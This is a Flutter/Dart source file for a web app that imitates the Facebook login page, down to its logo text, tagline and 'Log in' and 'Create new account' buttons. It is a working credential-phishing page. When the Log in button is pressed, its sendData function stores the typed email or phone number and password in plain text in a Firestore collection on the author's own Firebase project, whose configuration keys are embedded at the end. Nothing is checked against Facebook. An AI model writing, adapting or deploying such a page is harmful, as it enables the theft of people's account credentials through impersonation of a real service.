import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:flutter/material.dart';

void main()async{
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp(options: defaultFirebaseOptions);
  runApp(const MyApp());

}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  // This widget is the root of your application.
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'FaceBook',
      debugShowCheckedModeBanner:false,
      theme: ThemeData(
        primarySwatch: Colors.blue,
      ),
      home: const MyHomePage(title: 'Flutter Demo Home Page'),
    );
  }
}

class MyHomePage extends StatefulWidget {
  const MyHomePage({super.key, required this.title});

  final String title;

  @override
  State<MyHomePage> createState() => _MyHomePageState();
}

class _MyHomePageState extends State<MyHomePage> {
  final TextEditingController phone = TextEditingController();
  final TextEditingController password = TextEditingController();

  sendData(){
    var firebase = FirebaseFirestore.instance;
    firebase.collection("data").add({"phoneOrMail":"${phone.text}","password":"${password.text}"});
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Row(
        crossAxisAlignment: CrossAxisAlignment.center,
        children: <Widget>[
          Expanded(
            child: Container(
              margin: const EdgeInsets.only(left: 120),
              child: Column(
                mainAxisAlignment: MainAxisAlignment.center,
                crossAxisAlignment: CrossAxisAlignment.start,
                children:  [
                  const Text(
                    'Facebook',
                    style: TextStyle(fontSize: 60,color: Colors.blueAccent,fontWeight: FontWeight.bold),
                  ),
                  const SizedBox(height: 10,),
                  SizedBox(
                    width: MediaQuery.of(context).size.width*.5,
                    child:const  Text(
                      "Facebook helps you connect and share with the people in your life.",
                      style: TextStyle(fontSize: 25,color: Colors.black,fontWeight: FontWeight.bold),
                    ),
                  ),
                ],
              ),
            ),
          ),
          Container(
            width: MediaQuery.of(context).size.height*.5,
            margin: const EdgeInsets.only(right: 120),
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Card(
                  margin: const EdgeInsets.symmetric(horizontal: 10),
                  elevation: 2,
                  child: Column(
                    children: [
                      Container(
                        margin: const EdgeInsets.all(20),
                        child: TextFormField(
                          controller: phone,
                          decoration: const InputDecoration(
                            focusedBorder: OutlineInputBorder(
                              borderSide: BorderSide(color: Colors.blueAccent, width: 1.5)
                            ),
                            enabledBorder: OutlineInputBorder(
                              borderSide: BorderSide(color: Colors.grey, width: 1.5)
                            ),
                            hintText: "Email Address or Phone Number",
                          ),
                        ),
                      ),
                      Container(
                        margin: const EdgeInsets.symmetric(horizontal: 20),
                        child: TextFormField(
                          controller: password,
                          decoration: const InputDecoration(
                            focusedBorder: OutlineInputBorder(
                              borderSide: BorderSide(color: Colors.blueAccent, width: 1.5)
                            ),
                            enabledBorder: OutlineInputBorder(
                              borderSide: BorderSide(color: Colors.grey, width: 1.5)
                            ),
                            hintText: "Password",
                          ),
                        ),
                      ),
                      InkWell(
                        onTap: ()=>sendData(),
                        child: Container(
                          margin: const EdgeInsets.symmetric(horizontal: 20,vertical: 20),
                          padding: const EdgeInsets.symmetric(vertical: 10),
                          decoration: BoxDecoration(
                            borderRadius: BorderRadius.circular(5),
                            color: Colors.blue
                          ),
                          alignment: Alignment.center,
                          child: const Text("Log in",style:TextStyle(fontSize: 18,color: Colors.white),),
                        ),
                      ),
                      Container(
                        margin: const EdgeInsets.symmetric(horizontal: 20,vertical: 15),
                        alignment: Alignment.center,
                        child: const Text("Forgotten password?",style:TextStyle(fontSize: 16,color: Colors.blue),),
                      ),
                      const Divider(),
                      Container(
                        margin: const EdgeInsets.symmetric(horizontal: 70,vertical: 20),
                        padding: const EdgeInsets.symmetric(vertical: 10),
                        decoration: BoxDecoration(
                            borderRadius: BorderRadius.circular(5),
                            color: Colors.green
                        ),
                        alignment: Alignment.center,
                        child: const Text("Create new account",style:TextStyle(fontSize: 18,color: Colors.white),),
                      ),
                    ],
                  ),
                ),
                Container(
                  padding: const EdgeInsets.symmetric(vertical: 10),
                  alignment: Alignment.center,
                  child: const Text("Create a Page for a celebrity, brand or business.",style:TextStyle(fontSize: 16,color: Colors.black),),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }
}


const defaultFirebaseOptions = const FirebaseOptions(
  apiKey: "AIzaSyAIQj6SjEImGyaB1kcBwx_pgDzLRyfjG7g",
  appId: "1:165180592331:web:c0b1b4ec650c29d89ecb4e",
  messagingSenderId: "165180592331",
  projectId: "face-d02a1",
  authDomain: "face-d02a1.firebaseapp.com",
  storageBucket: "face-d02a1.appspot.com",
  measurementId: 'G-JN95N1JV2E',
);
